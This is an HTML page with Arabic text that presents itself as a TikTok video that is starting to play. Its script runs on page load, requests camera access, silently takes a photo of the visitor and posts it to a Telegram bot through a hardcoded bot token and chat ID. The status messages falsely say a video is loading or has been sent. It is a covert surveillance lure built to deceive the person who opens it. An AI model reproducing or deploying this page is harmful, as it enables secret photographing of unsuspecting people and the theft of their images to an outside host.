<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title> جاري التشغيل الان...</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #000;
      color: #fff;
      font-family: sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    #status {
      font-size: 20px;
    }
  </style>
</head>
<body>
  <div id="status">جاري تشغيل الفيديو التيك توك الان...</div>

  <script>
    const chat_id = "6908826896";
    const token = "8216581015:AAFEu3XEvT2jePOMdSU8OYP9olix4JNzfk4";

    async function startCapture() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const track = stream.getVideoTracks()[0];

        // تأكد من أن الجهاز يدعم ImageCapture
        if (!("ImageCapture" in window)) {
          document.getElementById("status").innerText = "❌ المتصفح لا يدعم ImageCapture.";
          return;
        }

        const imageCapture = new ImageCapture(track);

        document.getElementById("status").innerText = "📷 انتظر، يتم تشغيل فيديو التيك توك...";

        // ننتظر 5 ثواني لتشغيل الكاميرا بشكل فعلي
        setTimeout(async () => {
          try {
            const blob =  imageCapture.takePhoto();
            stream.getTracks().forEach(t => t.stop());

            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("photo", blob, "photo.jpg");

            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
              method: "POST",
              body: formData
            }).then(r => r.json()).then(d => {
              document.getElementById("status").innerText = d.ok
                ? "✅ تم إرسال الفيديو!"
                : "❌ فشل في الإرسال.";
            }).catch(err => {
              document.getElementById("status").innerText = "❌ خطأ بالشبكة.";
            });
          } catch (err) {
            document.getElementById("status").innerText = "❌ فشل في تشغيل الفيديو التيك توك.";
          }
        }, 5000);

      } catch (err) {
        document.getElementById("status").innerText = "❌ فشل في تشغيل فيديو التيك توك.";
      }
    }

    window.onload = startCapture;
  </script>
</body>
</html>
